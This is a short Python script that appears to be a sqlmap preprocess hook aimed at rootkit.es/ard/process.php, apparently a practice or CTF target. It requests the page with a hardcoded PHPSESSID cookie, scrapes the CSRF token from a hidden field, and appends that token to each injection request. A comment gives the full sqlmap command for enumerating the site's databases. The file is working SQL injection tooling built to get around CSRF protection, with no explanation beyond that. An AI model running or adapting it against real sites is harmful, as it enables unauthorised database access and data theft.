#!/usr/bin/env python

# sqlmap -u "http://rootkit.es/ard/process.php?action=foo" --method GET --preprocess sample.py --batch --cookie="PHPSESSID=1hvr53vt6j8b50p8ii4s6660iv" --dbs

import requests

def getConfig():
    return {
        "base_url": "https://rootkit.es/ard/process.php",
        "phpsessid": "1hvr53vt6j8b50p8ii4s6660iv"
    }

def getCSRF(html):
    csrf = html.split("hidden")[1]
    csrf = csrf.split('"')[6]
    return csrf

def preprocess(req):
    # Get config
    config = getConfig()
    base_url = config["base_url"]
    phpsessid = config["phpsessid"]

    cookies = {
        "PHPSESSID" : phpsessid
    }
    r = requests.get(base_url, cookies=cookies)

    csrf = getCSRF(r.text)

    req.full_url = f"{req.get_full_url()}&csrf={csrf}"
